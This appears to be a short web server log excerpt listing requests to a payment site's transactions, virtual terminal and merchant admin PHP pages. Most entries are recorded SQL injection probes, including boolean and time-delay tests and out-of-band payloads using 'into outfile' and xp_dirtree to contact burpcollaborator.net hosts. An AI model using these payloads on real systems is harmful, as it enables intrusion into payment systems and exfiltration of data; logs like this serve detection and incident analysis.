+/transactions.php/1%20into%20outfile%20'\\\\\\\\1kmcnvw6o4toq6yllej44r7w3n9ex51tvgm4b.burpcollaborator.net\\\\hxy'%3b%20--%20 1 16655 0 0
+/transactions.php/115399628%20or%206829%3d6829--%20 1 16655 0 0
+/virtualterminal.php/111110211%20or%202600%3d2601 1 19650 0 0
+/transactions.php/1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\\\ciynl6uhmfrzohwwjphf22571y7pvgl4fr6fv.burpcollab'%2b'orator.net\\quc'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 1 16655 0 0
+/transactions.php/1%2b(select*from(select(sleep(20)))a)%2b 1 16655 0 0
+/virtualterminal.php/1%20and%202014%3d2014--%20 1 19650 0 0
+/php/inc_admin_all_merchantgateway.php 4 684 0 0
+/transactions.php/1%2c0)waitfor%20delay'0%3a0%3a20'-- 1 16655 0 0
+/virtualterminal.php/1'%20and%205002%3d5003--%20 1 19650 0 0
+/transactions.php/115399628%20or%206829%3d6829 1 16655 0 0
+/virtualterminal.php/120055291'%20or%208931%3d8931--%20 1 19650 0 0
+/php/inc_relatedtransactions.php 1 222 0 0
+/virtualterminal.php/1%20into%20outfile%20'\\\\\\\\aeslh4qfidnxkfsufnddy015xw3mrdv1pogc5.burpcollaborator.net\\\\htb'%3b%20--%20 1 19650 0 0
+/php/inc_admin_mpg_fees.php 2 1884 0 0
+END_SIDER
